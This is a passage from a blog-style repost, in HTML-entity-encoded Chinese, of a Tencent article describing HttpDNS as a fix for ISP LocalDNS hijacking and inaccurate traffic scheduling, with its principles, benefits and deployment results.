;&#x7684;&#x8BDD;&#xFF0C;&#x5728;PC&#x7AEF;&#x548C;&#x624B;&#x673A;&#x5BA2;&#x6237;&#x7AEF;&#x7684;WiFI&#x4E0B;&#x9762;&#x8FD8;&#x7B97;&#x52C9;&#x5F3A;&#x53EF;&#x884C;&#x3002;&#x4F46;&#x662F;&#x8981;&#x7528;&#x6237;&#x4FEE;&#x6539;&#x5728;&#x79FB;&#x52A8;&#x4E92;&#x8054;&#x7F51;&#x73AF;&#x5883;&#x4E0B;&#x7684;DNS&#x914D;&#x7F6E;&#xFF0C;&#x5176;&#x96BE;&#x5EA6;&#x4E0D;&#x8A00;&#x800C;&#x55BB;&#x3002;</p>\n<h3 id=\"3&#x3001;&#x5B8C;&#x5168;&#x629B;&#x5F03;&#x57DF;&#x540D;&#xFF0C;&#x81EA;&#x5EFA;connectcenter&#x8FDB;&#x884C;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#xFF1A;\"><a href=\"#3&#x3001;&#x5B8C;&#x5168;&#x629B;&#x5F03;&#x57DF;&#x540D;&#xFF0C;&#x81EA;&#x5EFA;connectcenter&#x8FDB;&#x884C;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#xFF1A;\" class=\"headerlink\" title=\"3&#x3001;&#x5B8C;&#x5168;&#x629B;&#x5F03;&#x57DF;&#x540D;&#xFF0C;&#x81EA;&#x5EFA;connectcenter&#x8FDB;&#x884C;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#xFF1A;\"></a>3&#x3001;&#x5B8C;&#x5168;&#x629B;&#x5F03;&#x57DF;&#x540D;&#xFF0C;&#x81EA;&#x5EFA;connectcenter&#x8FDB;&#x884C;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#xFF1A;</h3><p>&#x5982;&#x679C;&#x8981;&#x91C7;&#x7528;&#x8FD9;&#x79CD;&#x8FD9;&#x79CD;&#x65B9;&#x6848;&#x7684;&#x8BDD;&#xFF0C;&#x9996;&#x5148;&#x4F60;&#x5C31;&#x5F97;&#x8981;&#x62FF;&#x5230;&#x4E00;&#x4EFD;&#x51C6;&#x786E;&#x7684;IP&#x5730;&#x5740;&#x5E93;&#x6765;&#x5224;&#x65AD;&#x7528;&#x6237;&#x7684;&#x5F52;&#x5C5E;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x5236;&#x5B9A;&#x4E2A;&#x534F;&#x8BAE;&#x642D;&#x4E2A;connect center&#x6765;&#x505A;&#x8C03;&#x5EA6;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x5BF9;&#x63A5;&#x5165;&#x5C42;&#x505A;&#x8C03;&#x5EA6;&#x6539;&#x9020;&#x3002;&#x8FD9;&#x79CD;&#x65B9;&#x6848;&#x548C;2&#x79CD;&#x65B9;&#x6848;&#x4E00;&#x6837;&#xFF0C;&#x4E0D;&#x662F;&#x4E0D;&#x80FD;&#x505A;&#xFF0C;&#x53EA;&#x662F;&#x6210;&#x672C;&#x4F1A;&#x6BD4;&#x8F83;&#x9AD8;&#xFF0C;&#x5C24;&#x5176;&#x5BF9;&#x4E8E;&#x817E;&#x8BAF;&#x8FD9;&#x79CD;&#x4E1A;&#x52A1;&#x89C4;&#x6A21;&#x5982;&#x6B64;&#x5E9E;&#x5927;&#x7684;&#x516C;&#x53F8;&#x800C;&#x8A00;&#x3002;</p>\n<h2 id=\"&#x4E09;&#x3001;&#x5229;&#x7528;HttpDNS&#x89E3;&#x51B3;&#x7528;&#x6237;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#xFF1A;\"><a href=\"#&#x4E09;&#x3001;&#x5229;&#x7528;HttpDNS&#x89E3;&#x51B3;&#x7528;&#x6237;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#xFF1A;\" class=\"headerlink\" title=\"&#x4E09;&#x3001;&#x5229;&#x7528;HttpDNS&#x89E3;&#x51B3;&#x7528;&#x6237;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#xFF1A;\"></a>&#x4E09;&#x3001;&#x5229;&#x7528;HttpDNS&#x89E3;&#x51B3;&#x7528;&#x6237;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#xFF1A;</h2><p>&#x65E2;&#x7136;&#x4E0A;&#x9762;&#x7684;&#x65B9;&#x6848;&#x90FD;&#x5B58;&#x5728;&#x90A3;&#x4E48;&#x591A;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x90A3;&#x6709;&#x6CA1;&#x6709;&#x4E00;&#x79CD;&#x8C03;&#x5EA6;&#x7CBE;&#x51C6;&#x3001;&#x6210;&#x672C;&#x4F4E;&#x5EC9;&#x3001;&#x914D;&#x7F6E;&#x65B9;&#x4FBF;&#x7684;&#x57FA;&#x4E8E;&#x57DF;&#x540D;&#x7684;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x7CFB;&#x7EDF;&#x5462;&#xFF1F;&#x7B54;&#x6848;&#x662F;&#x80AF;&#x5B9A;&#x7684;&#x3002;&#x817E;&#x8BAF;&#x516C;&#x53F8;&#x7684;GSLB &#x56E2;&#x961F;&#x63A8;&#x51FA;&#x4E86;&#x4E00;&#x79CD;&#x5168;&#x65B0;&#x7684;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x8C03;&#x5EA6;&#x7CFB;&#x7EDF;&#xFF1A;HttpDNS&#x3002;HttpDNS&#x662F;&#x4E3A;&#x79FB;&#x52A8;&#x5BA2;&#x6237;&#x7AEF;&#x91CF;&#x8EAB;&#x5B9A;&#x505A;&#x7684;&#x57FA;&#x4E8E;Http&#x534F;&#x8BAE;&#x548C;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x7684;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x4E13;&#x6CBB;LocalDNS&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x4EE5;&#x53CA;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x4E0D;&#x51C6;&#x3002;&#x8BE6;&#x7EC6;&#x4ECB;&#x7ECD;&#x5982;&#x4E0B;&#xFF1A;</p>\n<h3 id=\"1&#x3001;HttpDNS&#x57FA;&#x672C;&#x539F;&#x7406;&#xFF1A;\"><a href=\"#1&#x3001;HttpDNS&#x57FA;&#x672C;&#x539F;&#x7406;&#xFF1A;\" class=\"headerlink\" title=\"1&#x3001;HttpDNS&#x57FA;&#x672C;&#x539F;&#x7406;&#xFF1A;\"></a>1&#x3001;HttpDNS&#x57FA;&#x672C;&#x539F;&#x7406;&#xFF1A;</h3><p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%85%A8%E5%B1%80%E7%B2%BE%E7%A1%AE%E6%B5%81%E9%87%8F%E8%B0%83%E5%BA%A6%E6%96%B0%E6%80%9D%E8%B7%AF-HttpDNS%E6%9C%8D%E5%8A%A1%E8%AF%A6%E8%A7%A3/5.jpg\" alt=\"&#x56FE;&#x7247;5\">  </p>\n<p>HttpDNS&#x7684;&#x539F;&#x7406;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;&#x4E3B;&#x8981;&#x6709;&#x4E24;&#x6B65;&#xFF1A;</p>\n<p>A&#x3001;&#x5BA2;&#x6237;&#x7AEF;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;HttpDNS&#x63A5;&#x53E3;&#xFF0C;&#x83B7;&#x53D6;&#x4E1A;&#x52A1;&#x5728;&#x57DF;&#x540D;&#x914D;&#x7F6E;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E0A;&#x914D;&#x7F6E;&#x7684;&#x8BBF;&#x95EE;&#x5EF6;&#x8FDF;&#x6700;&#x4F18;&#x7684;IP&#x3002;&#xFF08;&#x57FA;&#x4E8E;&#x5BB9;&#x707E;&#x8003;&#x8651;&#xFF0C;&#x8FD8;&#x662F;&#x4FDD;&#x7559;&#x6B21;&#x9009;&#x4F7F;&#x7528;&#x8FD0;&#x8425;&#x5546;LocalDNS&#x89E3;&#x6790;&#x57DF;&#x540D;&#x7684;&#x65B9;&#x5F0F;&#xFF09;</p>\n<p>B&#x3001;&#x5BA2;&#x6237;&#x7AEF;&#x5411;&#x83B7;&#x53D6;&#x5230;&#x7684;IP&#x540E;&#x5C31;&#x5411;&#x76F4;&#x63A5;&#x5F80;&#x6B64;IP&#x53D1;&#x9001;&#x4E1A;&#x52A1;&#x534F;&#x8BAE;&#x8BF7;&#x6C42;&#x3002;&#x4EE5;Http&#x8BF7;&#x6C42;&#x4E3A;&#x4F8B;&#xFF0C;&#x901A;&#x8FC7;&#x5728;header&#x4E2D;&#x6307;&#x5B9A;host&#x5B57;&#x6BB5;&#xFF0C;&#x5411;HttpDNS&#x8FD4;&#x56DE;&#x7684;IP&#x53D1;&#x9001;&#x6807;&#x51C6;&#x7684;Http&#x8BF7;&#x6C42;&#x5373;&#x53EF;&#x3002;</p>\n<h3 id=\"2&#x3001;HttpDNS&#x4F18;&#x52BF;&#xFF1A;\"><a href=\"#2&#x3001;HttpDNS&#x4F18;&#x52BF;&#xFF1A;\" class=\"headerlink\" title=\"2&#x3001;HttpDNS&#x4F18;&#x52BF;&#xFF1A;\"></a>2&#x3001;HttpDNS&#x4F18;&#x52BF;&#xFF1A;</h3><p>&#x4ECE;&#x539F;&#x7406;&#x4E0A;&#x6765;&#x8BB2;&#xFF0C;HttpDNS&#x53EA;&#x662F;&#x5C06;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x7684;&#x534F;&#x8BAE;&#x7531;DNS&#x534F;&#x8BAE;&#x6362;&#x6210;&#x4E86;Http&#x534F;&#x8BAE;&#xFF0C;&#x5E76;&#x4E0D;&#x590D;&#x6742;&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x4E00;&#x5FAE;&#x5C0F;&#x7684;&#x8F6C;&#x6362;&#xFF0C;&#x5374;&#x5E26;&#x6765;&#x4E86;&#x65E0;&#x6570;&#x7684;&#x6536;&#x76CA;&#xFF1A;</p>\n<p>A&#x3001;&#x6839;&#x6CBB;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#xFF1A;&#x7531;&#x4E8E;&#x7ED5;&#x8FC7;&#x4E86;&#x8FD0;&#x8425;&#x5546;&#x7684;LocalDNS&#xFF0C;&#x7528;&#x6237;&#x89E3;&#x6790;&#x57DF;&#x540D;&#x7684;&#x8BF7;&#x6C42;&#x901A;&#x8FC7;Http&#x534F;&#x8BAE;&#x76F4;&#x63A5;&#x900F;&#x4F20;&#x5230;&#x4E86;&#x817E;&#x8BAF;&#x7684;HttpDNS&#x670D;&#x52A1;&#x5668;IP&#x4E0A;&#xFF0C;&#x7528;&#x6237;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x8BF7;&#x6C42;&#x5C06;&#x4E0D;&#x4F1A;&#x906D;&#x53D7;&#x5230;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x7684;&#x56F0;&#x6270;&#x3002;</p>\n<p>B&#x3001;&#x8C03;&#x5EA6;&#x7CBE;&#x51C6;&#xFF1A;HttpDNS&#x80FD;&#x76F4;&#x63A5;&#x83B7;&#x53D6;&#x5230;&#x7528;&#x6237;IP&#xFF0C;&#x901A;&#x8FC7;&#x7ED3;&#x5408;&#x817E;&#x8BAF;&#x81EA;&#x6709;&#x4E13;&#x5229;&#x6280;&#x672F;&#x751F;&#x6210;&#x7684;IP&#x5730;&#x5740;&#x5E93;&#x4EE5;&#x53CA;&#x6D4B;&#x901F;&#x7CFB;&#x7EDF;&#xFF0C;&#x53EF;&#x4EE5;&#x4FDD;&#x8BC1;&#x5C06;&#x7528;&#x6237;&#x5F15;&#x5BFC;&#x7684;&#x8BBF;&#x95EE;&#x6700;&#x5FEB;&#x7684;IDC&#x8282;&#x70B9;&#x4E0A;&#x3002;</p>\n<p>C&#x3001;&#x5B9E;&#x73B0;&#x6210;&#x672C;&#x4F4E;&#x5EC9;&#xFF1A;&#x63A5;&#x5165;HttpDNS&#x7684;&#x4E1A;&#x52A1;&#x4EC5;&#x9700;&#x8981;&#x5BF9;&#x5BA2;&#x6237;&#x7AEF;&#x63A5;&#x5165;&#x5C42;&#x505A;&#x5C11;&#x91CF;&#x6539;&#x9020;&#xFF0C;&#x65E0;&#x9700;&#x7528;&#x6237;&#x624B;&#x673A;&#x8FDB;&#x884C;root&#x6216;&#x8D8A;&#x72F1;&#xFF1B;&#x800C;&#x4E14;&#x7531;&#x4E8E;Http&#x534F;&#x8BAE;&#x8BF7;&#x6C42;&#x6784;&#x9020;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;&#x517C;&#x5BB9;&#x5404;&#x7248;&#x672C;&#x7684;&#x79FB;&#x52A8;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x66F4;&#x4E0D;&#x6210;&#x95EE;&#x9898;&#xFF1B;&#x53E6;&#x5916;HttpDNS&#x7684;&#x540E;&#x7AEF;&#x914D;&#x7F6E;&#x5B8C;&#x5168;&#x590D;&#x7528;&#x73B0;&#x6709;&#x6743;&#x5A01;DNS&#x914D;&#x7F6E;&#xFF0C;&#x7BA1;&#x7406;&#x6210;&#x672C;&#x4E5F;&#x975E;&#x5E38;&#x4F4E;&#x3002;&#x603B;&#x800C;&#x8A00;&#x4E4B;&#xFF0C;&#x5C31;&#x662F;&#x4EE5;&#x6700;&#x5C0F;&#x7684;&#x6539;&#x9020;&#x6210;&#x672C;&#xFF0C;&#x89E3;&#x51B3;&#x4E86;&#x4E1A;&#x52A1;&#x906D;&#x53D7;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x5E76;&#x6EE1;&#x8DB3;&#x4E1A;&#x52A1;&#x7CBE;&#x786E;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x7684;&#x9700;&#x6C42;&#x3002;</p>\n<p>D&#x3001;&#x6269;&#x5C55;&#x6027;&#x5F3A;&#xFF1A;HttpDNS&#x63D0;&#x4F9B;&#x53EF;&#x9760;&#x7684;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x670D;&#x52A1;&#xFF0C;&#x4E1A;&#x52A1;&#x53EF;&#x5C06;&#x81EA;&#x6709;&#x8C03;&#x5EA6;&#x903B;&#x8F91;&#x4E0E;HttpDNS&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x7ED3;&#x5408;&#xFF0C;&#x5B9E;&#x73B0;&#x66F4;&#x7CBE;&#x7EC6;&#x5316;&#x7684;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x3002;&#x6BD4;&#x5982;&#x6307;&#x5B9A;&#x7248;&#x672C;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x6307;&#x5B9A;&#x7F51;&#x7EDC;&#x7C7B;&#x578B;&#x7684;&#x7528;&#x6237;&#x8FDE;&#x63A5;&#x6307;&#x5B9A;&#x7684;IP&#x5730;&#x5740;&#x7B49;&#x3002;</p>\n<p>&#x5F53;&#x7136;&#x5404;&#x4F4D;&#x53EF;&#x80FD;&#x4F1A;&#x95EE;&#xFF1A;&#x7528;&#x6237;&#x5C06;&#x9996;&#x9009;&#x7684;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x65B9;&#x5F0F;&#x5207;&#x6362;&#x5230;&#x4E86;HttpDNS&#xFF0C;&#x90A3;&#x4E48;HttpDNS&#x7684;&#x9AD8;&#x53EF;&#x7528;&#x53C8;&#x662F;&#x5982;&#x4F55;&#x4FDD;&#x8BC1;&#x7684;&#x5462;&#xFF1F;&#x53E6;&#x5916;&#x4E0D;&#x540C;&#x8FD0;&#x8425;&#x5546;&#x7684;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x5230;&#x540C;&#x4E00;&#x4E2A;HttpDNS&#x7684;&#x670D;&#x52A1;IP&#xFF0C;&#x7528;&#x6237;&#x7684;&#x8BBF;&#x95EE;&#x5EF6;&#x8FDF;&#x5982;&#x4F55;&#x4FDD;&#x8BC1;&#xFF1F;</p>\n<p>&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x9AD8;&#x53EF;&#x7528;&#x53CA;&#x63D0;&#x5347;&#x7528;&#x6237;&#x4F53;&#x9A8C;&#xFF0C;HttpDNS&#x901A;&#x8FC7;&#x63A5;&#x5165;&#x4E86;&#x817E;&#x8BAF;&#x516C;&#x7F51;&#x4EA4;&#x6362;&#x5E73;&#x53F0;&#x7684;BGP Anycast&#x7F51;&#x7EDC;&#xFF0C;&#x4E0E;&#x5168;&#x56FD;&#x591A;&#x4E2A;&#x4E3B;&#x6D41;&#x8FD0;&#x8425;&#x5546;&#x5EFA;&#x7ACB;&#x4E86;BGP&#x4E92;&#x8054;&#xFF0C;&#x4FDD;&#x8BC1;&#x4E86;&#x8FD9;&#x4E9B;&#x8FD0;&#x8425;&#x5546;&#x7684;&#x7528;&#x6237;&#x80FD;&#x591F;&#x5FEB;&#x901F;&#x5730;&#x8BBF;&#x95EE;&#x5230;HttpDNS&#x670D;&#x52A1;&#xFF1B;&#x53E6;&#x5916;HttpDNS&#x5728;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x4E2D;&#x5FC3;&#x8FDB;&#x884C;&#x4E86;&#x90E8;&#x7F72;&#xFF0C;&#x4EFB;&#x610F;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#x53D1;&#x751F;&#x6545;&#x969C;&#x65F6;&#x5747;&#x80FD;&#x65E0;&#x7F1D;&#x5207;&#x6362;&#x5230;&#x5907;&#x4EFD;&#x8282;&#x70B9;&#xFF0C;&#x4FDD;&#x8BC1;&#x7528;&#x6237;&#x89E3;&#x6790;&#x6B63;&#x5E38;&#x3002;</p>\n<h2 id=\"&#x56DB;&#x3001;&#x63A5;&#x5165;&#x6548;&#x679C;&#x53CA;&#x672A;&#x6765;&#x5C55;&#x671B;&#xFF1A;\"><a href=\"#&#x56DB;&#x3001;&#x63A5;&#x5165;&#x6548;&#x679C;&#x53CA;&#x672A;&#x6765;&#x5C55;&#x671B;&#xFF1A;\" class=\"headerlink\" title=\"&#x56DB;&#x3001;&#x63A5;&#x5165;&#x6548;&#x679C;&#x53CA;&#x672A;&#x6765;&#x5C55;&#x671B;&#xFF1A;\"></a>&#x56DB;&#x3001;&#x63A5;&#x5165;&#x6548;&#x679C;&#x53CA;&#x672A;&#x6765;&#x5C55;&#x671B;&#xFF1A;</h2><p>&#x5F53;&#x524D;HttpDNS&#x5DF2;&#x5728;&#x817E;&#x8BAF;&#x5185;&#x90E8;&#x63A5;&#x5165;&#x4E86;&#x591A;&#x4E2A;&#x4E1A;&#x52A1;&#xFF0C;&#x8986;&#x76D6;&#x6570;&#x4EBF;&#x7528;&#x6237;&#xFF0C;&#x5E76;&#x5DF2;&#x6301;&#x7EED;&#x7A33;&#x5B9A;&#x8FD0;&#x884C;&#x8D85;&#x8FC7;&#x4E00;&#x5E74;&#x65F6;&#x95F4;&#x3002;&#x800C;&#x63A5;&#x5165;&#x4E86;HttpDNS&#x7684;&#x4E1A;&#x52A1;&#x5728;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x4F53;&#x9A8C;&#x65B9;&#x9762;&#x90FD;&#x6709;&#x4E86;&#x975E;&#x5E38;&#x5927;&#x7684;&#x63D0;&#x5347;&#x3002;&#x4EE5;&#x67D0;&#x4E2A;&#x63A5;&#x5165;HttpDNS&#x7684;&#x4E1A;&#x52A1;&#x4E3A;&#x4F8B;&#xFF0C;&#x8BE5;&#x4E1A;&#x52A1;&#x4EC5;&#x901A;&#x8FC7;&#x63A5;&#x5165;HttpDNS&#xFF0C;&#x5728;&#x672A;&#x505A;&#x4EFB;&#x4F55;&#x5176;&#x5B83;&#x4F18;&#x5316;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7528;&#x6237;&#x5E73;&#x5747;&#x8BBF;&#x95EE;&#x5EF6;&#x8FDF;&#x4E0B;&#x964D;&#x8D85;&#x8FC7;10%&#xFF0C;&#x8BBF;&#x95EE;&#x5931;&#x8D25;&#x7387;&#x4E0B;&#x964D;&#x4E86;&#x8D85;&#x8FC7;&#x4E94;&#x5206;&#x4E4B;&#x4E00;&#xFF0C;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x4F53;&#x9A8C;&#x7684;&#x6548;&#x679C;&#x63D0;&#x5347;&#x975E;&#x5E38;&#x663E;&#x8457;&#x3002;&#x53E6;&#x5916;&#x817E;&#x8BAF;&#x7684;HttpDNS&#x670D;&#x52A1;&#x9664;&#x4E86;&#x5728;&#x817E;&#x8BAF;&#x5185;&#x90E8;&#x88AB;&#x5E7F;&#x6CDB;&#x4F7F;&#x7528;&#x4EE5;&#x5916;&#xFF0C;&#x4E5F;&#x53D7;&#x5230;&#x4E86;&#x4E1A;&#x52A1;&#x540C;&#x884C;&#x7684;&#x80AF;&#x5B9A;&#x3002;&#x56FD;&#x5185;&#x6700;&#x5927;&#x7684;publicDNS&#x670D;&#x52A1;&#x5546;114dns&#x5728;&#x53D7;&#x5230;&#x817E;&#x8BAF;DNS&#x7684;&#x542F;&#x53D1;&#x4E0B;&#xFF0C;&#x4E5F;&#x63A8;&#x51FA;&#x4E86;HttpDNS&#x670D;&#x52A1;&#x3002;</p>\n<p>&#x5728;&#x672A;&#x6765;&#x7684;&#x65E5;&#x5B50;&#x91CC;&#xFF0C;&#x817E;&#x8BAF;GSLB&#x56E2;&#x961F;&#x5C06;&#x4F1A;&#x5728;&#x817E;&#x8BAF;&#x5185;&#x90E8;&#x8FDB;&#x4E00;&#x6B65;&#x63A8;&#x5E7F;HttpDNS&#x670D;&#x52A1;&#xFF0C;&#x5E76;&#x5C06;&#x5728;&#x5B9E;&#x9645;&#x4E1A;&#x52A1;&#x7684;&#x9700;&#x6C42;&#x4E0B;&#x5BF9;HttpDNS&#x670D;&#x52A1;&#x8FDB;&#x884C;&#x5347;&#x7EA7;&#xFF0C;&#x5982;&#x63D0;&#x4F9B;&#x66F4;&#x4E3A;&#x901A;&#x7528;&#x3001;&#x5B89;&#x5168;&#x3001;&#x7B80;&#x5355;&#x7684;&#x63A5;&#x5165;&#x534F;&#x8BAE;&#xFF0C;&#x8FDB;&#x4E00;&#x6B65;&#x63D0;&#x5347;&#x63A5;&#x5165;&#x7528;&#x6237;&#x7684;&#x7F51;&#x7EDC;&#x8BBF;&#x95EE;&#x4F53;&#x9A8C;&#x7B49;&#x7B49;&#x3002;&#x5E0C;&#x671B;HttpDNS&#x80FD;&#x4E3A;&#x5404;&#x4F4D;&#x5728;&#x89E3;&#x51B3;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x53CA;&#x5168;&#x5C40;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x5931;&#x6548;&#x65B9;&#x9762;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x3001;&#x53EF;&#x884C;&#x7684;&#x601D;&#x8DEF;&#xFF0C;&#x4E5F;&#x6B22;&#x8FCE;&#x5404;&#x4F4D;&#x4E1A;&#x754C;&#x540C;&#x884C;&#x4E0E;&#x817E;&#x8BAF;&#x4E00;&#x8D77;&#xFF0C;&#x5C31;&#x5982;&#x4F55;&#x8FDB;&#x884C;&#x66F4;&#x7CBE;&#x51C6;&#x7684;&#x5168;&#x5C40;&#x6D41;&#x91CF;&#x8C03;&#x5EA6;&#x65B9;&#x9762;&#x8FDB;&#x884C;&#x66F4;&#x4E3A;&#x6DF1;&#x5165;&#x7684;&#x8BA8;&#x8BBA;&#x3002;</p>\n<p>&#x539F;&#x6587;&#x94FE;&#x63A5;&#xFF1A;<a href=\"http://www.zmke.com/i/8705.html\" target=\"_blank\" rel=\"external\">http://www.zmke.com/i/8705.html</a></p>\n","excerpt":"<p>&#x4F46;&#x51E1;&#x4F7F;&#x7528;&#x57DF;&#x540D;&#x6765;&#x7ED9;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x670D;&#x52A1;&#x7684;&#x4E92;&#x8054;&#x7F51;&#x4F01;&#x4E1A;&#xFF0C;&#x90FD;&#x6216;&#x591A;&#x6216;&#x5C11;&#x5730;&#x65E0;&#x6CD5;&#x907F;&#x514D;&#x5728;&#x6709;&#x4E2D;&#x56FD;&#x7279;&#x8272;&#x7684;&#x4E92;&#x8054;&#x7F51;&#x73AF;&#x5883;&#x4E2D;&#x906D;&#x9047;&#x5230;&#x5404;&#x79CD;&#x57DF;&#x540D;&#x88AB;&#x7F13;&#x5B58;&#x3001;&#x7528;&#x6237;&#x8DE8;&#x7F51;&#x8BBF;&#x95EE;&#x7F13;&#x6162;&#x7B49;&#x95EE;&#x9898;&#x3002;&#x90A3;&#x4E48;&#x5BF9;&#x4E8E;&#x817E;&#x8BAF;&#x8FD9;&#x6837;&#x7684;&#x57DF;&#x540D;&#x6570;&#x91CF;&#x5728;10&#x4E07;&#x7EA7;&#x522B;&#x7684;&#x4E92;&#x8054;&#x7F51;&#x516C;&#x53F8;&#x6765;&#x8BB2;&#xFF0C;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x7684;&#x60C5;&#x51B5;&#x5230;&#x5E95;&#x6709;&#x591A;&#x4E25;&#x91CD;&#x5462;&#xFF1F;&#x6BCF;&#x5929;&#x817E;&#x8BAF;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x76D1;&#x6D4B;&#x7CFB;&#x7EDF;&#x5728;&#x4E0D;&#x505C;&#x5730;&#x5BF9;&#x5168;&#x56FD;&#x6240;&#x6709;&#x7684;&#x91CD;&#x70B9;LocalDNS&#x8FDB;&#x884C;&#x63A2;&#x6D4B;&#xFF0C;&#x817E;&#x8BAF;&#x57DF;&#x540D;&#x5728;&#x5168;&#x56FD;&#x5404;&#x5730;&#x7684;&#x65E5;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x91CF;&#x662F;&#x5DF2;&#x7ECF;&#x8D85;&#x8FC7;&#x4E86;80&#x4E07;&#x6761;&#x3002;&#x8FD9;&#x7ED9;&#x817E;&#x8BAF;&#x7684;&#x4E1A;&#x52A1;&#x5E26;&#x6765;&#x4E86;&#x5DE8;&#x5927;&#x7684;&#x635F;&#x5931;&#x3002;&#x4E3A;&#x6B64;&#x817E;&#x8BAF;&#x5EFA;&#x7ACB;&#x4E86;&#x4E13;&#x4E1A;&#x7684;&#x56E2;&#x961F;&#x4E0E;&#x5404;&#x4E2A;&#x8FD0;&#x8425;&#x5546;&#x8FDB;&#x884C;&#x4E86;&#x6DF1;&#x5EA6;&#x6C9F;&#x901A;&#xFF0C;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x5404;&#x79CD;&#x539F;&#x56E0;&#xFF0C;&#x5904;&#x7406;&#x6548;&#x7387;&#x53CA;&#x6548;&#x679C;&#x5747;&#x4E0D;&#x80FD;&#x8FBE;&#x5230;&#x817E;&#x8BAF;&#x5404;&#x4E1A;&#x52A1;&#x90E8;&#x95E8;&#x7684;&#x9700;&#x6C42;&#x3002;&#x9664;&#x4E86;&#x548C;&#x8FD0;&#x8425;&#x5546;&#x8FDB;&#x884C;&#x6C9F;&#x901A;&#xFF0C;&#x6709;&#x6CA1;&#x6709;&#x4E00;&#x79CD;&#x6280;&#x672F;&#x4E0A;&#x7684;&#x65B9;&#x6848;&#xFF0C;&#x80FD;&#x4ECE;&#x6839;&#x6E90;&#x4E0A;&#x89E3;&#x51B3;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5F02;&#x5E38;&#x53CA;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x8DE8;&#x7F51;&#x7684;&#x95EE;&#x9898;&#x5462;&#xFF1F;</p>\n<h2 id=\"&#x4E00;&#x3001;&#x95EE;&#x9898;&#x6839;&#x6E90;&#xFF1A;\"><a href=\"#&#x4E00;&#x3001;&#x95EE;&#x9898;&#x6839;&#x6E90;&#xFF1A;\" class=\"headerlink\" title=\"&#x4E00;&#x3001;&#x95EE;&#x9898;&#x6839;&#x6E90;&#xFF1A;\"></a>&#x4E00;&#x3001;&#x95EE;&#x9898;&#x6839;&#x6E90;&#xFF1A;</h2><p>&#x8981;&#x89E3;&#x51B3;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x5F97;&#x5148;&#x5F97;&#x4E86;&#x89E3;&#x4E0B;&#x73B0;&#x5728;&#x56FD;&#x5185;&#x5404;ISP&#x7684;LocalDNS&#x7684;&#x57FA;&#x672C;&#x60C5;&#x51B5;&#x3002;&#x56FD;&#x5185;&#x8FD0;&#x8425;&#x5546;LocalDNS&#x9020;&#x6210;&#x7684;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x5F02;&#x5E38;&#x53EF;&#x4EE5;&#x5F52;&#x4E3A;&#x4E0B;&#x4E09;&#x7C7B;&#xFF1A;</p>\n<h3 id=\"1&#x3001;&#x57DF;&#x540D;&#x7F13;&#x5B58;&#xFF1A;\"><a href=\"#1&#x3001;&#x57DF;&#x540D;&#x7F13;&#x5B58;&#xFF1A;\" class=\"headerlink\" 